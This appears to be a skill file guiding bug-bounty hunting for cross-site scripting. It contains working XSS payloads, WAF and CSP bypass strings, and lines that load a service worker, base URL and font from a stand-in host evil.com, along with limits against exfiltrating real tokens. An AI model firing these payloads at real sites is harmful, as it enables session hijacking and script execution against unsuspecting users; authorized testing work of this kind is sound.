---
name: hunt-xss
description: XSS — reflected, stored, DOM, postMessage, WAF bypass, CSP bypass. Must demonstrate script execution in victim's context.
---

# XSS HUNTING — 3 BULLETS MAX

**Core:** Malicious script EXECUTES in victim's browser with their session.

## DIFFERENTIAL
```bash
# Normal input → safe
curl -s "https://target.com/search?q=hello" | grep "hello"
# Payload → unescaped = XSS
curl -s "https://target.com/search?q=<script>alert(1)</script>" | grep "<script>"
```

## PAYLOADS (by context)
```
HTML context:    <script>alert(1)</script>  <img src=x onerror=alert(1)>
Attribute:      " onfocus=alert(1) autofocus="  ' onmouseover=alert(1)'
JS context:      '-alert(1)-'  \-alert(1)//
URL context:     javascript:alert(1)
DOM sources:     location.hash, document.referrer, window.name
DOM sinks:       innerHTML, document.write, eval, setTimeout(string)
```

## WAF BYPASS
```
Case: <ScRiPt>  Comment: <scr/**/ipt>  Encoding: &#x3C;script&#x3E;
Double: %253Cscript%253E  SVG: <svg/onload=alert(1)>
Details: <details open ontoggle=alert(1)>
Input: <input onfocus=alert(1) autofocus>
Polyglot: '"><marquee><img src=x onerror=confirm(1)></marquee>
```

## CSP BYPASS
```
JSONP: <script src="https://target.com/jsonp?callback=alert(1)//"></script>
Angular: <script src="angular.min.js"></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>
Base: <base href="https://evil.com/">  Font: @font-face{src:url('https://evil.com/font')}
Service Worker: navigator.serviceWorker.register('https://evil.com/sw.js')
```

## COMPOUND RISK (note it, don't stage it)
```
Reflected XSS + cookie theft      → note: session impact depends on cookie flags
Stored XSS + admin views content  → note: would reach privileged users
DOM XSS + OAuth flow              → note: token exposure depends on flow
Self-XSS + CSRF                   → note: needs a delivery vector to matter
```

Report the XSS you proved, at the severity its **actual** impact supports.
Check the cookie flags (`HttpOnly` is the norm) and say what is reachable;
do not attempt to ride an admin session or exfiltrate a real token to make the
report look bigger. If cookie theft is genuinely possible, one demonstration
against your own test account is the whole proof.

## FALSE POSITIVES
- Payload HTML-encoded (`&lt;`) → not XSS
- In JS string (needs different escape) → not XSS
- Self-XSS only → **not reportable** (Gate 6); do not try to weaponize delivery
- CSP blocks execution → not XSS (report the CSP gap separately, if at all)
